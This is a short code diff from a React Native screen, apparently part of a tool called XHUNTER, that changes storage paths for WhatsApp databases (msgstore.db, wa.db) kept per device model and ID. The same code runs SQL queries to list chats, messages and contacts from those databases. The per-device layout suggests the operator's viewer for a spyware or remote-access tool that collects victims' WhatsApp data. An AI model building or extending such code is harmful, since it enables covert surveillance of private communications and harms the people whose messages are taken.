@@ -41,7 +41,7 @@ const WhatsappMessages = ({navigation,route}) => {
   
   const checkIfDatabaseAvailable=()=>{
     const dirs = RNFetchBlob.fs.dirs;
-    var path = dirs.SDCardDir +`/documents/XHUNTER/${devices[deviceId].model} (${deviceId})/msgstore.db`;
+    var path = dirs.SDCardDir +`/XHUNTER/${devices[deviceId].model} (${deviceId})/msgstore.db`;
     //var path = dirs.SDCardDir +`/msgstore.db`;
     RNFetchBlob.fs.exists(path).then((flag) => {
      if(!flag){
@@ -55,7 +55,7 @@ const WhatsappMessages = ({navigation,route}) => {
 
   const checkIfWADatabaseAvailable=()=>{
     const dirs = RNFetchBlob.fs.dirs;
-    var path = dirs.SDCardDir +`/documents/XHUNTER/${devices[deviceId].model} (${deviceId})/wa.db`;
+    var path = dirs.SDCardDir +`/XHUNTER/${devices[deviceId].model} (${deviceId})/wa.db`;
     //var path = dirs.SDCardDir +`/msgstore.db`;
     RNFetchBlob.fs.exists(path).then((flag) => {
      if(!flag){
@@ -81,7 +81,7 @@ const WhatsappMessages = ({navigation,route}) => {
 
    const fetchChatList =()=>{
     const dirs = RNFetchBlob.fs.dirs;
-    var path = dirs.SDCardDir +`/documents/XHUNTER/${devices[deviceId].model} (${deviceId})/msgstore.db`;
+    var path = dirs.SDCardDir +`/XHUNTER/${devices[deviceId].model} (${deviceId})/msgstore.db`;
    //var path = dirs.SDCardDir +`/msgstore.db`;
     var chatQuery="SELECT chat_view.raw_string_jid AS id, messages.key_from_me AS isFromMe, messages.media_mime_type AS isMedia, messages.data, max(messages.timestamp) AS timestamp FROM chat_view LEFT OUTER JOIN messages on messages.key_remote_jid = chat_view.raw_string_jid WHERE chat_view.hidden = 0 GROUP BY chat_view.raw_string_jid, chat_view.subject, chat_view.created_timestamp ORDER BY max(messages.timestamp) desc"
     AppBuilder.readDB(path, chatQuery, (d)=>setChatList(d));
@@ -89,7 +89,7 @@ const WhatsappMessages = ({navigation,route}) => {
 
    const fetchContacts =()=>{
     const dirs = RNFetchBlob.fs.dirs;
-     var path = dirs.SDCardDir +`/documents/XHUNTER/${devices[deviceId].model} (${deviceId})/wa.db`;
+     var path = dirs.SDCardDir +`/XHUNTER/${devices[deviceId].model} (${deviceId})/wa.db`;
      //var path = dirs.SDCardDir +`/wa.db`;
       var chatQuery=`SELECT jid, status, display_name FROM wa_contacts`
       AppBuilder.readDB(path, chatQuery, (d)=>setContactList(d));
